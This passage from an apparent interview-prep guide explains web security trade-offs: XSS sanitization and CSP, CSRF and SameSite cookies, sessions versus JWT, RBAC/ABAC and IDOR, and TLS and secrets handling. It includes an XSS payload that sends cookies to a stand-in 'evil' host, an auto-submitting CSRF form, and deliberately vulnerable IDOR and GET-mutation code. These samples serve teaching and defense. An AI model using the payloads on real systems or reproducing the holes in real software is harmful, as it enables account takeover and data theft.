| DOMPurify sanitization | Lets you safely support rich HTML (editors, markdown) | Adds ~45KB, must run on every render or memoize; allow-list drift breaks legitimate content |
| Strict CSP with nonces | Neutralizes injected scripts even after a bypass | Breaks inline scripts/styles and many analytics/ad SDKs; nonce plumbing through SSR is fiddly |
| `httpOnly` cookies over localStorage | Tokens un-stealable by injected JS | Now exposed to CSRF (see Q29) — you trade one attack class for another |
| Sanitize on write (store clean) vs on read | Cheaper reads, single choke point | Corrupts original data; a sanitizer bug is permanent; hard to change allow-list retroactively |

> **The core trade-off to say out loud:** sanitize-on-**read** keeps raw data intact and lets you fix sanitizer bugs retroactively, but pays CPU on every render; sanitize-on-**write** is faster to serve but permanently mutates stored data and can't recover from an over-aggressive filter. Most senior teams choose sanitize-on-read + strict CSP as defense-in-depth.

#### Common Mistakes

**1. Sanitizing on the client only:**

```javascript
// USELESS — attacker calls your API directly with curl, bypassing the browser entirely
// Client-side sanitization is a UX nicety, NOT a security control. Sanitize server-side.
```

**2. Blocklisting instead of allow-listing:**

```javascript
// BROKEN — endless bypasses: <img onerror>, <svg onload>, <iframe srcdoc>, unicode tricks
const clean = input.replace(/<script>/gi, '');
// Allow-list what's permitted; never try to enumerate everything dangerous.
```

**3. `'unsafe-inline'` in CSP — silently defeats the whole policy:**

```javascript
scriptSrc: ["'self'", "'unsafe-inline'"] // now ANY injected inline <script> runs — CSP is theater
```

#### Follow-up Questions

1. Why doesn't React protect you in Next.js SSR when interpolating into a `<script>` tag or JSON state? *(server-rendered HTML context differs from JSX escaping; use `serialize-javascript` / htmlescape for embedded JSON)*
2. What's the difference between CSP `nonce` and `hash` sources, and when would you pick each?
3. How does `Trusted Types` (CSP Level 3) eliminate DOM XSS at the sink level?
4. A markdown renderer outputs HTML — where exactly do you sanitize in the pipeline?
5. How does `SameSite=Strict` reduce XSS *impact* even though it targets CSRF?

#### Real Production Example

At an Atlassian-scale collaboration product, user-authored "page content" supported rich HTML and was rendered via `dangerouslySetInnerHTML`. A researcher submitted a page body containing `<img src=x onerror="fetch('//evil/'+document.cookie)">`. Because session tokens were in `httpOnly` cookies, `document.cookie` returned nothing useful — but the payload still made authenticated API calls as the viewing user (CSRF-style, riding their session), silently adding the attacker as an admin on any space a victim viewed.

**Fix applied:** (1) DOMPurify with a strict allow-list on render, (2) a nonce-based CSP with `connect-src 'self'` so the `fetch('//evil/...')` was blocked at the network layer even after the DOM injection, (3) re-authentication (step-up) required for privilege-changing actions so a ridden session couldn't grant admin. Three independent layers — any one alone was insufficient.

#### Performance Considerations

- DOMPurify on large documents is O(n) over the DOM tree — memoize the sanitized output with `useMemo` keyed on the raw input, don't re-sanitize every render
- CSP adds a response header (~200 bytes) and zero runtime cost — it's enforced by the browser, not your server
- Nonce generation must use a CSPRNG (`crypto.randomBytes`), one per response — cache-busting means these responses can't be edge-cached with a static nonce

#### Scalability Considerations

- Centralize the CSP and sanitizer config in a shared middleware/library so every new service and micro-frontend inherits the same policy — divergent CSPs across teams are how gaps open
- Ship CSP in `report-only` mode first behind a reporting endpoint; at scale you'll discover dozens of legitimate inline scripts you didn't know about before you can safely enforce
- Trusted Types scales better than manual sink auditing in large codebases — it makes unsafe DOM sinks throw at runtime, turning a code-review problem into a build/runtime guarantee

> **Interviewer Note:** Naming the three XSS types is Junior+. Knowing the four React escape hatches is Senior. Articulating the sanitize-on-read-vs-write trade-off and the httpOnly-trades-XSS-for-CSRF trade-off, plus a layered CSP story, is Staff/Principal signal.

---

### Q29 — CSRF: Why SameSite Cookies Changed Everything, and When You Still Need Tokens

*Asked at: Google · Microsoft · Uber · Salesforce*

#### Why Interviewers Ask This

CSRF is the natural follow-up to "store JWTs in httpOnly cookies" (Q23/Q28) — the moment you use cookies for auth, you inherit CSRF risk. Interviewers want to know if you understand *why* CSRF works (ambient cookie authority), why `SameSite` mostly-but-not-entirely solves it, and the trade-off between cookies (CSRF-prone) and `Authorization` headers (XSS-prone).

#### Beginner Answer

> "CSRF is when a malicious site makes requests to your site on behalf of a logged-in user. You add a CSRF token to prevent it."

**Score: 3 / 10 — Correct mechanism, but no understanding of SameSite, why tokens work, or the cookie-vs-header trade-off**

#### Senior Engineer Answer

CSRF exploits **ambient authority**: the browser automatically attaches your site's cookies to *any* request to your domain, even one triggered by a different site. The attacker never sees the response — they don't need to; the state-changing side effect already happened.

```text
1. Victim logs into bank.com  → browser stores session cookie
2. Victim visits evil.com (still logged into bank.com in another tab)
3. evil.com page contains:
      <form action="https://bank.com/transfer" method="POST">
        <input name="to" value="attacker"><input name="amount" value="10000">
      </form>
      <script>document.forms[0].submit()</script>
4. Browser sends the POST to bank.com WITH the session cookie attached automatically
5. bank.com sees a valid session → executes the transfer
```

**Defense 1 — `SameSite` cookie attribute (the modern first line):**

```javascript
res.cookie('session', sid, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',   // cookie NOT sent on cross-site POST/PUT/DELETE, or cross-site iframes
});
// 'strict' → cookie sent ONLY for same-site requests (even top-level nav from another site drops it)
// 'lax'    → sent on top-level GET navigations, blocked on cross-site POST/subrequests (good default)
// 'none'   → always sent (requires Secure); needed for legitimate cross-site cookies (embeds, SSO)
```

**Defense 2 — Synchronizer token pattern (still needed for `SameSite=None` / legacy browsers):**

```javascript
// Server issues a random token tied to the session, delivered in a non-cookie channel
app.get('/form', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken;      // stored server-side against the session
  res.render('form', { csrfToken });      // embedded in the form as a hidden field / meta tag
});

app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) return res.sendStatus(403); // attacker can't read it
});
// Works because evil.com CANNOT read the token (same-origin policy blocks reading the response)
```

**Defense 3 — Double-submit cookie (stateless, for token-in-cookie APIs):**

```javascript
// Token set as a readable cookie AND echoed in a custom header by your JS.
// evil.com can't read the cookie to copy it into the header (SOP), and can't set custom headers
// cross-origin without triggering a CORS preflight your server rejects.
```

> **The key insight most miss:** APIs authenticated with an `Authorization: Bearer` header (not a cookie) are **inherently immune to CSRF** — the browser doesn't auto-attach headers, only cookies. CSRF is exclusively a cookie-auth problem. That's the whole trade-off with Q28's httpOnly recommendation.

#### Trade-offs

| Approach | Advantage | Disadvantage (the real cost) |
|---|---|---|
| Cookie auth (`httpOnly`) | Immune to XSS token theft; automatic, no client code | Inherits CSRF — needs SameSite + possibly tokens; awkward for mobile/native clients |
| `Authorization: Bearer` header | Immune to CSRF; works uniformly for web/mobile/service-to-service | Token lives in JS-reachable storage → stealable by XSS; you manage attach/refresh logic |
| `SameSite=Strict` | Strongest CSRF defense, zero token plumbing | Breaks legit cross-site entry (a link from email/Slack drops the cookie → user looks logged out) |
| `SameSite=Lax` (default) | Blocks the dangerous cross-site POST while keeping top-level nav working | GET-based state changes are still exposed (which is why GETs must be side-effect-free) |
| Synchronizer token (stateful) | Works everywhere, including `SameSite=None` and old browsers | Requires server-side session storage; breaks stateless/multi-instance unless token store is shared |
| Double-submit (stateless) | No server storage; scales horizontally | Weaker if a subdomain is compromised (cookie can be overwritten); needs careful `Host-` cookie prefixing |

> **The trade-off to say out loud:** "Cookie vs header auth is a choice between which attack you'd rather defend — cookies force you to handle CSRF, headers force you to handle XSS token theft. There is no option with neither. Most modern web apps pick `httpOnly` cookies + `SameSite=Lax` + CSRF tokens on mutating routes, because XSS-driven silent exfiltration is worse than CSRF, which SameSite already mostly kills."

#### Common Mistakes

**1. Using GET for state changes:**

```javascript
// BROKEN — SameSite=Lax still sends cookies on top-level GET navigation
app.get('/account/delete', deleteAccount); // <img src="/account/delete"> triggers it
// RULE: mutations must be POST/PUT/DELETE/PATCH, never GET
```

**2. Assuming a JSON `Content-Type` is protection:**

```javascript
// PARTIALLY true — a simple <form> can only send urlencoded/multipart, so requiring
// application/json + rejecting others blocks form-based CSRF. But it is NOT sufficient alone:
// combine with SameSite; don't rely on content-type checks as your only defense.
```

**3. Putting the CSRF token in a place evil.com can read:**

```javascript
// BROKEN — if the token is returned by a CORS-enabled GET endpoint that allows any origin,
// the attacker fetches it first. The token's security depends on same-origin read protection.
```

#### Follow-up Questions

1. Why is an `Authorization: Bearer` API immune to CSRF but a cookie-based one is not? *(browsers auto-send cookies, never custom headers)*
2. How does `SameSite=Lax` interact with OAuth redirect flows and SSO? *(top-level POST callbacks can break — often need `None` for the auth cookie)*
3. What is the `__Host-` cookie prefix and how does it harden double-submit? *(forces Secure + path=/ + no Domain, prevents subdomain overwrite)*
4. Can CSRF exist without cookies at all? *(HTTP Basic auth and client TLS certs are also ambient — yes)*
5. Why must the synchronizer token be per-session (or per-request) and unpredictable?

#### Real Production Example

A Salesforce-scale B2B app moved auth from `Authorization` headers to `httpOnly` cookies to close an XSS token-theft finding (Q28). Two weeks later a pentester demonstrated CSRF: a crafted page auto-submitted a POST to `/api/team/invite`, and because the session cookie rode along, it added an external attacker to victims' orgs. The header-based version had been immune to this — the "fix" for XSS opened CSRF.

**Fix applied:** Kept the `httpOnly` cookie (XSS protection was still wanted) but added `SameSite=Lax`, a double-submit CSRF token validated on every mutating route via shared middleware, and a rule enforced in code review that all state changes use non-GET verbs. The lesson written into their security guidelines: "changing the auth transport changes your threat model — re-run the CSRF/XSS analysis every time."

#### Performance Considerations

- `SameSite` and CSRF token checks are effectively free (a string compare / attribute on the cookie) — no measurable latency
- Synchronizer tokens require a session lookup per mutating request; if sessions live in Redis that's ~1ms — double-submit avoids this at the cost of the subdomain-trust weakness
- Rotating CSRF tokens per-request (vs per-session) increases security marginally but defeats multi-tab usage and adds churn — per-session is the common balance

#### Scalability Considerations

- Stateful synchronizer tokens need a **shared** session store (Redis) across instances, or a user hitting a different instance fails validation — same constraint as Q23's rate limiter
- Double-submit is the stateless-friendly choice for horizontally-scaled APIs, but demands `__Host-` prefixed cookies and strict subdomain hygiene at org scale
- Standardize CSRF protection in a gateway/shared middleware so every new service inherits it — per-team implementations drift and leave GET-based or unprotected routes

> **Interviewer Note:** Explaining ambient authority and the SameSite modes is Senior. Articulating that cookie-vs-header auth is a CSRF-vs-XSS trade-off with no free option — and that changing transport changes the threat model — is Staff/Principal signal.

---

### Q30 — Authentication: Sessions vs JWT, Refresh Token Rotation, and OAuth2/OIDC

*Asked at: Amazon · Google · Uber · Airbnb · Okta*

#### Why Interviewers Ask This

"Sessions or JWT?" is the single most common auth debate, and most candidates parrot "JWT is stateless and scales better" without understanding what statelessness *costs* — chiefly, you can't instantly revoke a JWT. Interviewers want the honest trade-off, the refresh-token rotation pattern, and where OAuth/OIDC fit.

#### Beginner Answer

> "JWT is better than sessions because it's stateless — the server doesn't have to store anything, so it scales. You just verify the signature."

**Score: 3 / 10 — Repeats the marketing line, ignores revocation, token theft, expiry, and the real trade-off**

#### Senior Engineer Answer

The core distinction is **where trust lives**:

```text
Session (stateful)                     JWT (stateless / self-contained)
─────────────────                      ────────────────────────────────
Client holds an opaque session ID      Client holds a signed token with claims
Server stores session → user mapping   Server stores nothing; verifies signature
Every request: DB/Redis lookup         Every request: local signature check (no I/O)
Revoke = delete the row (instant)      Revoke = ??? (token valid until it expires)
```

**Sessions — the classic, still excellent choice:**

```javascript
// Session ID is opaque and random; all authority is server-side
app.use(session({
  store: new RedisStore({ client: redisClient }),   // shared across instances
  secret: process.env.SESSION_SECRET,
  cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 },
}));
// Logout / ban / password-change → redisClient.del(`sess:${id}`) → instant, global revocation
```

**JWT — the access + refresh token pattern (do NOT use a single long-lived JWT):**

```javascript
// Access token: short-lived (5–15 min), self-contained, checked with NO DB lookup
const accessToken = jwt.sign({ sub: user.id, role: user.role }, ACCESS_SECRET,
  { expiresIn: '15m', algorithm: 'HS256' });

// Refresh token: long-lived (days), OPAQUE, stored server-side so it CAN be revoked
const refreshToken = crypto.randomBytes(40).toString('hex');
await redis.set(`refresh:${refreshToken}`, user.id, 'EX', 60 * 60 * 24 * 7);

// This hybrid is the honest answer: short access tokens keep the "no lookup" win for
// most requests, while the revocable refresh token restores the control sessions have.
```

**Refresh token rotation + reuse detection (the part that separates seniors):**

```javascript
// On each refresh, issue a NEW refresh token and invalidate the old one.
// If an OLD (already-rotated) token is ever presented again → it was stolen and replayed:
// revoke the ENTIRE token family (log the user out everywhere).
app.post('/refresh', async (req, res) => {
  const old = req.cookies.refresh;
  const userId = await redis.get(`refresh:${old}`);
  if (!userId) {                              // unknown or already-rotated token
    await revokeAllTokensFor(suspectedUser);  // reuse detected → nuke the family
    return res.sendStatus(401);
  }
  await redis.del(`refresh:${old}`);          // rotate
  const next = issueRefresh(userId);
  res.cookie('refresh', next, { httpOnly: true, secure: true, sameSite: 'strict' });
});
```

**OAuth2 / OIDC — delegation, not a login form:**

```text
OAuth2  = authorization (delegated access to resources — "let App X read my calendar")
OIDC    = authentication layer on top of OAuth2 (adds the id_token — "who is this user")

Authorization Code + PKCE flow (the correct flow for SPAs & mobile in 2024+):
  App → /authorize (redirect) → user logs in at provider → provider redirects back
      with a one-time code → App exchanges code + PKCE verifier for tokens (server-side)
  PKCE prevents code interception; the implicit flow is deprecated — never use it.
```

#### Trade-offs

| Approach | Advantage | Disadvantage (the real cost) |
|---|---|---|
| Server sessions (opaque ID) | **Instant revocation**, small cookie, easy to reason about, no claims leakage | Stateful — needs shared Redis; a lookup per request; sticky-session/store availability concerns |
| Single long-lived JWT | No DB lookup, trivially horizontal, self-describing | **Cannot revoke** before expiry — a stolen token is valid until it expires; logout is a lie |
| Access + refresh (hybrid) | Keeps "no lookup" for most calls, restores revocation via the refresh store | More moving parts; refresh endpoint becomes a high-value target; rotation logic is subtle |
| JWT with a denylist | Enables revocation | Reintroduces the per-request lookup you adopted JWT to avoid — you've rebuilt sessions, worse |
| OAuth2/OIDC (delegated) | No password handling; SSO; provider owns MFA/breach detection | External dependency & latency; complex flows; misconfigured redirect URIs are a classic vuln |

> **The trade-off to say out loud:** "JWT's headline benefit — no server state — *is* its headline cost: you can't revoke what you don't track. So the real production choice is rarely 'pure JWT'; it's sessions (accept the lookup, get instant revocation) or access+refresh (get the no-lookup win on the hot path, pay for revocation only at refresh time). Anyone proposing a single long-lived JWT for a security-sensitive app hasn't hit a 'we need to force-logout a compromised user *now*' incident yet."

#### Common Mistakes

**1. Storing a long-lived JWT in `localStorage`:**

```javascript
// DOUBLE FAIL — readable by any XSS (Q28), AND can't be revoked when stolen.
localStorage.setItem('token', jwt); // 30-day expiry = 30-day account takeover window
```

**2. Not restricting the `alg` (algorithm confusion — links back to Q23):**

```javascript
jwt.verify(token, secret);                          // accepts alg:none / RS256→HS256 attacks
jwt.verify(token, secret, { algorithms: ['HS256'] }); // FIXED — pin the algorithm
```

**3. Treating JWT expiry as a security boundary while ignoring theft:**

```javascript
// A 15-min access token still gives a 15-min window. Pair with refresh rotation + reuse
// detection so a stolen token surfaces on the next legitimate refresh.
```

#### Follow-up Questions

1. How do you force-logout a specific user across all their devices in a pure-JWT system? *(you can't cleanly — you need a denylist or short expiry + refresh revocation; this is the crux)*
2. Why PKCE over the implicit flow for SPAs? *(no token in the URL fragment; protects the auth code from interception)*
3. Where do you store the refresh token in a browser to minimize both XSS and CSRF risk? *(`httpOnly` cookie scoped to `/refresh` + SameSite + rotation)*
4. What's in an OIDC `id_token` vs an OAuth2 `access_token`, and why must a resource server never trust an `id_token`?
5. How does JWT signature verification differ between HS256 (shared secret) and RS256 (public/private) at scale? *(RS256 lets services verify with a public key without holding the signing secret)*

#### Real Production Example

An Airbnb-scale marketplace used 7-day JWTs in `localStorage` for "better UX — users stay logged in." A supplier's laptop was compromised via a malicious npm dependency (Q23 supply-chain) that read `localStorage` and exfiltrated the token. Because the JWT was self-contained and long-lived, the attacker had 7 days of valid API access, and the security team had **no mechanism to revoke it** — they had to rotate the signing secret, which force-logged-out every user on the platform simultaneously.

**Fix applied:** Migrated to 15-minute access tokens + opaque refresh tokens in `httpOnly`/`SameSite=Strict` cookies with rotation and reuse detection. A stolen access token now expires in minutes; a stolen refresh token is caught on next rotation and revokes the whole family for that user only. Revocation became a targeted, one-user operation instead of a platform-wide outage.

#### Performance Considerations

- Sessions add a Redis lookup (~0.5–1ms) per authenticated request — usually negligible next to the actual business query, but it's a hard dependency on the store's availability
- JWT verification is CPU (signature check), not I/O — HS256 is fast; RS256 is ~10x slower to verify but removes secret distribution — measure if you verify millions/sec
- Refresh endpoints are called rarely (once per access-token lifetime) so their per-call cost (DB write for rotation) is amortized to near-zero on the hot path

#### Scalability Considerations

- The "JWT scales, sessions don't" claim is overstated: a Redis session store handles 100k+ lookups/sec trivially, and it's shared infra you likely already run for caching (Q25) and rate limiting (Q23)
- JWT's genuine scaling win is **cross-service** — downstream microservices verify a signed token locally without calling an auth service; with RS256 they only need the public key (fetched from a JWKS endpoint)
- At org scale, centralize auth in an identity provider (OIDC) so token issuance, MFA, rotation, and breach response live in one audited place instead of re-implemented per service

> **Interviewer Note:** "JWT is stateless so it scales" is a Junior red flag if unqualified. Explaining that statelessness costs revocability, presenting the access+refresh hybrid with rotation and reuse detection, and knowing PKCE/OIDC is Staff/Principal signal.

---

### Q31 — Authorization: RBAC vs ABAC, and the IDOR/BOLA Bug That Passes Every Auth Check

*Asked at: Google · Amazon · Salesforce · Atlassian · Uber*

#### Why Interviewers Ask This

Authentication (who you are) is well-trodden; **authorization** (what you may do) is where real breaches happen — Broken Object-Level Authorization (BOLA/IDOR) has been #1 on the OWASP API Security Top 10. Interviewers want to know if you can distinguish authN from authZ and whether you'd catch the bug where a valid, logged-in user accesses *another* user's data.

#### Beginner Answer

> "Authorization is checking if the user is allowed to do something. I check their role — if they're an admin, they can access admin routes."

**Score: 3 / 10 — Only covers role-gating routes; completely misses object-level authorization (IDOR), the most common real-world authz bug**

#### Senior Engineer Answer

Two distinct questions, often conflated:

```text
Function-level authZ  → "Can this ROLE call this endpoint?"        (RBAC on the route)
Object-level authZ    → "Can this USER access THIS SPECIFIC record?" (ownership check)
```

Most teams get the first right and forget the second — that's IDOR/BOLA.

**The IDOR bug — passes authentication, passes role check, still a breach:**

```javascript
// VULNERABLE — user is authenticated AND has the 'user' role, so both checks pass...
app.get('/api/invoices/:id', requireAuth, requireRole('user'), async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);  // NO ownership check!
  res.json(invoice);
});
// Attacker logged in as themselves changes the URL: /api/invoices/12345 → reads YOUR invoice.
// This is the #1 API breach class. The auth check is irrelevant — the record isn't theirs.

// FIXED — scope every query by the authenticated principal
app.get('/api/invoices/:id', requireAuth, async (req, res) => {
  const invoice = await Invoice.findOne({ _id: req.params.id, ownerId: req.user.id });
  if (!invoice) return res.sendStatus(404); // 404 not 403 — don't confirm the ID exists
  res.json(invoice);
});
```

**RBAC — roles map to permissions:**

```javascript
const permissions = {
  admin:  ['invoice:read:any', 'invoice:delete:any', 'user:manage'],
  member: ['invoice:read:own', 'invoice:create:own'],
};
function can(user, action) { return permissions[user.role]?.includes(action); }
// Simple, auditable, but coarse — "read:own" still needs the ownership check at query time
```

**ABAC — decisions from attributes/policy (scales past role explosion):**

```javascript
// Attribute-Based: evaluate (subject, action, resource, environment) against a policy
function canAccess(user, action, resource) {
  if (user.role === 'admin') return true;
  if (action === 'read'  && resource.ownerId === user.id) return true;
  if (action === 'read'  && resource.teamId === user.teamId && user.teamRole === 'lead') return true;
  return false;
}
// Externalize to a policy engine (OPA/Rego, Cedar) so policy changes don't require redeploys
```

**Defense-in-depth — enforce at the data layer, not just the controller:**

```javascript
// Row-level security (Postgres) / query middleware (Mongoose) makes ownership scoping
// the DEFAULT, so a forgotten controller check can't leak data:
invoiceSchema.pre(/^find/, function () {
  if (this.getOptions().skipAuthScope) return;
  this.where({ ownerId: this.getOptions().userId }); // every query auto-scoped
});
```

#### Trade-offs

| Model | Advantage | Disadvantage (the real cost) |
|---|---|---|
| RBAC (roles) | Simple, auditable, easy to reason about and grant/revoke | **Role explosion** — every new "manager of region X but only for product Y" needs a new role |
| ABAC (attributes/policy) | Fine-grained, expresses ownership/context/time without new roles | Harder to audit ("who can access this?" is a policy-eval question, not a table lookup); slower |
| Check in the controller | Explicit, close to the business logic | One forgotten route = IDOR breach; scattered across the codebase, easy to miss in review |
| Enforce at data layer (RLS/middleware) | Secure-by-default — a missed controller check still can't leak | Harder to express complex cross-entity rules; risk of over-blocking legit admin/reporting queries |
| Externalized policy engine (OPA) | Central audit, change policy without redeploy, consistent across services | Extra infra + latency per decision; policy language learning curve; a new failure mode to run |

> **The trade-off to say out loud:** "RBAC vs ABAC is simplicity vs expressiveness. Start with RBAC because it's auditable; reach for ABAC (or a policy engine) only when you feel role explosion — proliferating roles like `regionX_productY_readonly`. And regardless of model, object-level ownership must be enforced at query time or ideally the data layer, because that's the check every IDOR breach proves teams forget."

#### Common Mistakes

**1. Checking authorization on the client / hiding the button:**

```javascript
// USELESS — the API is the security boundary. Hiding the delete button in the UI does nothing;
// the attacker calls DELETE /api/users/5 directly. Authorize on the server, every request.
{user.isAdmin && <DeleteButton />}   // UX only, NOT a control
```

**2. Returning 403 instead of 404 for objects the user can't access:**

```javascript
// 403 confirms the ID EXISTS → attacker enumerates valid IDs. Return 404 to avoid leaking existence.
```

**3. Trusting a role claim in a JWT without re-checking on privileged actions:**

```javascript
// A JWT minted when the user was an admin still says role:admin after they're demoted,
// until it expires. For high-privilege actions, verify current role from source of truth.
```

#### Follow-up Questions

1. What's the difference between IDOR and BOLA, and why is it OWASP API #1? *(same class; ubiquitous because ownership checks are easy to forget and invisible to authN tests)*
2. When does RBAC's role explosion force a move to ABAC? Give a concrete example.
3. How does Postgres Row-Level Security enforce object authZ below the application? What does it cost you?
4. Why prefer 404 over 403 for unauthorized object access, and when is that guidance wrong? *(when non-existence itself must be distinguishable, e.g. idempotent deletes)*
5. How would you audit "who can access resource X" under ABAC vs RBAC?

#### Real Production Example

A fintech (Salesforce-scale CRM integration) exposed `GET /api/v1/accounts/:accountId/statements`. Auth and a `requireRole('customer')` check both passed, but the handler never verified the `accountId` belonged to the caller. A researcher incremented `accountId` and pulled arbitrary customers' bank statements — a textbook BOLA. Every automated authentication test passed, because the attacker *was* properly authenticated; the missing check was authorization at the object level.

**Fix applied:** (1) Every data query rescoped to `WHERE owner_id = $currentUser` via Mongoose query middleware so scoping is the default, not per-route; (2) Postgres row-level security on the statements table as a second, database-enforced layer; (3) an automated test harness that, for every object endpoint, logs in as user A and asserts user B's IDs return 404; (4) 403→404 for cross-tenant access to stop ID enumeration. Defense at controller, data, and test layers.

#### Performance Considerations

- Scoping queries by `ownerId` is essentially free if the column is indexed — and it should be indexed anyway; add a compound index on `(ownerId, _id)` for these lookups
- Externalized policy engines (OPA) add a network hop per decision; mitigate by evaluating policy in-process (OPA as a sidecar/WASM) or caching decisions for a short TTL
- Row-level security in Postgres adds a predicate to every query — usually negligible with the right index, but verify it doesn't defeat an index on complex policies

#### Scalability Considerations

- RBAC tables scale fine; it's the *number of distinct roles* that explodes organizationally — that's a modeling problem, not a throughput one
- For microservices, centralize authorization policy (a shared policy engine or a well-defined authz service) so a rule change propagates everywhere instead of being re-coded per service — divergent authz logic is how one service becomes the weak link
- Enforcing ownership at the data layer (RLS / ORM middleware) scales your *safety* as the team grows: new engineers can't accidentally ship an IDOR because the default query is already scoped

> **Interviewer Note:** Distinguishing function-level from object-level authZ and immediately reaching for the ownership-scoped query is Senior. Explaining the RBAC-vs-ABAC simplicity/expressiveness trade-off, defense-in-depth at the data layer, and 404-vs-403 enumeration hardening — through a BOLA incident — is Staff/Principal signal.

---

### Q32 — Transport & Secrets: HTTPS/TLS, HSTS, and Never Committing a Secret Again

*Asked at: Amazon · Microsoft · Google · Cloudflare*

#### Why Interviewers Ask This

Every control above assumes the channel and the keys are safe. Interviewers use this to check the "boring but fatal" layer: do you understand what TLS actually protects, why HSTS exists, and how secrets leak — because a committed AWS key or a downgrade attack undoes all your careful auth work.

#### Beginner Answer

> "Use HTTPS so data is encrypted in transit, and keep secrets in a `.env` file instead of hardcoding them."

**Score: 3 / 10 — Right instinct, but `.env` files get committed, and there's no mention of HSTS, TLS termination, or secret rotation**

#### Senior Engineer Answer

**What TLS actually gives you (and what it doesn't):**

```text
TLS provides:  confidentiality (encryption) + integrity (tamper detection)
             + authentication of the SERVER (via the certificate chain)
TLS does NOT: authenticate the CLIENT (unless mTLS), protect data at rest,
             or help if the user is tricked onto an attacker's valid-cert domain
```

**HSTS — closing the first-request downgrade gap:**

```javascript
// Without HSTS, the first http:// request can be intercepted and downgraded (SSL strip)
// before the redirect to https:// happens. HSTS tells the browser: ALWAYS use HTTPS for
// this domain, for the next `maxAge` seconds — no plaintext request is ever sent again.
app.use(helmet.hsts({
  maxAge: 31536000,        // 1 year
  includeSubDomains: true,
  preload: true,           // eligible for the browser's hardcoded HSTS preload list
}));
```

**Where TLS terminates — the trade-off that surprises people:**

```text
Client ──TLS──▶ Load Balancer / CDN ──?──▶ App servers
                       (terminates TLS here)

Edge termination:  simpler, offloads crypto from app; but LB→app hop is plaintext
                   inside the VPC — fine only if the internal network is trusted.
End-to-end (mTLS): re-encrypt LB→app; needed for zero-trust / regulated (PCI/HIPAA) traffic.
```

**Secrets — the leak that ends careers:**

```javascript
// WRONG — committed to git, lives in history FOREVER even after deletion
const AWS_KEY = 'AKIA...';                 // hardcoded
// .env committed to the repo is the same mistake with extra steps

// BETTER — inject at runtime from a secrets manager, never touch disk in the repo
const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
const secret = await client.send(new GetSecretValueCommand({ SecretId: 'prod/db' }));
// Vault/AWS Secrets Manager/GCP Secret Manager support automatic rotation + audit logs
```

```bash
# Prevent the leak at the source
echo ".env" >> .gitignore
git secrets --install && git secrets --register-aws   # pre-commit hook blocks key patterns
# If a secret WAS committed: rotate it immediately (assume compromised), THEN scrub history.
# Scrubbing history is NOT enough on its own — the key is already public the moment it's pushed.
```

**mTLS for service-to-service (zero-trust interior):**

```text
In a microservice mesh, each service presents a client certificate; peers verify it.
Now a leaked API key isn't enough to call an internal service — you need a valid,
short-lived, rotatable cert. A service mesh (Istio/Linkerd) automates issuance/rotation.
```

#### Trade-offs

| Control | Advantage | Disadvantage (the real cost) |
|---|---|---|
| Edge TLS termination (CDN/LB) | Simple, crypto offloaded, cheap certs (ACM/Let's Encrypt), HTTP/2 & 3 at edge | LB→origin hop is plaintext — unacceptable for zero-trust/regulated without re-encryption |
| End-to-end / mTLS | Encrypted all the way; authenticates *both* ends; zero-trust interior | Cert lifecycle management is real ops burden; without a mesh it's painful; added latency |
| HSTS `preload` + `includeSubDomains` | Eliminates the downgrade window permanently | **Hard to undo** — a mistake (subdomain without HTTPS) locks users out until preload list updates (months) |
| `.env` files | Trivial for local dev | Get committed by accident; no rotation, no audit, no access control — not for production |
| Secrets manager (Vault/ASM) | Rotation, audit trail, fine-grained access, no secret on disk | Runtime dependency & latency; bootstrapping the *first* credential (the "secret-zero" problem) |
| Client-side env vars (SPA) | — | There are **no** frontend secrets: anything in the JS bundle is public. API keys in a React `.env` are visible in DevTools |

> **The trade-off to say out loud:** "Edge TLS termination is the pragmatic default — you get HTTPS cheaply and offload crypto — but it leaves the LB-to-origin hop in the clear, which is fine on a trusted VPC and unacceptable under a zero-trust or PCI/HIPAA mandate, where you pay the operational cost of mTLS. And HSTS preload is a one-way door: powerful, but a subdomain misconfiguration is painful to reverse, so you enable `includeSubDomains`/`preload` only once you're certain every subdomain is HTTPS."

#### Common Mistakes

**1. Putting a secret in a frontend environment variable:**

```javascript
// EXPOSED — REACT_APP_/NEXT_PUBLIC_ vars are embedded in the JS bundle, readable by anyone
const stripeSecret = process.env.REACT_APP_STRIPE_SECRET; // visible in DevTools → Sources
// Frontend gets PUBLISHABLE keys only; secret keys stay server-side, always.
```

**2. Thinking `git rm .env` fixes a committed secret:**

```bash
# The secret is still in git history AND already scraped by bots within seconds of a public push.
# Correct order: (1) ROTATE the credential now, (2) then scrub history (filter-repo/BFG).
```

**3. TLS termination at the edge with a plaintext internal hop in an untrusted network:**

```text
"We have HTTPS" — but the LB→app traffic crosses a shared network in plaintext.
An attacker on that network reads everything. Re-encrypt or use mTLS for the internal hop.
```

#### Follow-up Questions

1. What is the exact attack HSTS prevents, and why can't a plain http→https redirect prevent it alone? *(SSL strip on the first plaintext request before the redirect)*
2. What's the "secret-zero" / bootstrapping problem with a secrets manager, and how is it solved? *(instance IAM roles / workload identity — the platform vouches for the workload)*
3. How does certificate pinning help and why did mobile largely abandon strict pinning? *(breakage on cert rotation; moved to CT + short-lived certs)*
4. What does mTLS add over a shared API key for service-to-service auth? *(mutual authentication + short-lived, revocable, non-copyable credentials)*
5. How do TLS 1.3's changes (0-RTT, fewer round trips) affect the security/performance trade-off? *(0-RTT risks replay for non-idempotent requests)*

#### Real Production Example

A startup (later Amazon-acquired) pushed a commit with an AWS access key in a `config.js` "temporarily." Within ~3 minutes, automated scrapers found it and spun up dozens of GPU instances for crypto mining, generating a ~$50k bill overnight. The engineer's `git rm` the next morning did nothing — the key had been live and public for hours, and remained in history.

**Fix applied:** (1) Immediate key rotation via IAM (the only action that actually stops the bleeding), (2) all secrets moved to AWS Secrets Manager injected at runtime via instance IAM roles — no long-lived keys anywhere, (3) `git-secrets` pre-commit hooks + a CI scan (truffleHog/gitleaks) that fails the build on any key-shaped string, (4) AWS budget alerts so anomalous spend pages within minutes instead of surfacing on the monthly bill.

#### Performance Considerations

- TLS 1.3 cuts the handshake to one round trip (vs two in 1.2), materially reducing connection latency — always prefer 1.3
- Edge termination offloads the CPU cost of the TLS handshake from your app servers to the CDN/LB — a real throughput win at scale
- Secrets-manager fetches add latency at startup; cache the secret in memory for its rotation lifetime rather than fetching per request

